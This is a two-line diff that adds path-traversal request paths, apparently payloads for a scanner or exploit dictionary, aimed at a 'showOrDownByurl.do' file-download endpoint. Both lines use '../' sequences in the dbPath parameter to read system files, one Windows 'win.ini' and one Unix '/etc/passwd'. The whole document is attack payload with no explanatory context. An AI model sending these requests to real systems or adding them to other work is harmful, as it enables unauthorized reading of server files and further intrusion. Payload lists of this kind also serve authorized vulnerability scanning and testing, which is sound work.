@@ -1,0 +1,2 @@
+/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini
+/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
